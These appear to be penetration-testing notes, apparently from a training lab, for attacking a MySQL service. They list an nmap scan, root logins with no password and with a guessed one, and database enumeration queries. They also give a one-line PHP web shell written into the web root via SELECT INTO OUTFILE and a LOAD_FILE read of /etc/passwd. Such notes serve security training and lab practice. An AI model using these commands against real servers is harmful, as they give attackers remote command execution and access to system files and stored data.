1. Nmap: `sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*`
2. Interaction with MySQL:
    1. without pass: `mysql -u root -h 10.129.14.132`
    2. with pass: `mysql -u root -pP4SSw0rd -h 10.129.14.128`
3. Commands:
```bash
show databases;
select version();
use mysql;
show tables;
show columns from <table>;
select * from <table>;
select * from <table> where <column> = "<string>";
```
4. `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';`
5. `show variables like "secure_file_priv";`
6. MySQL - Read Local Files in MySQL: `select LOAD_FILE("/etc/passwd");`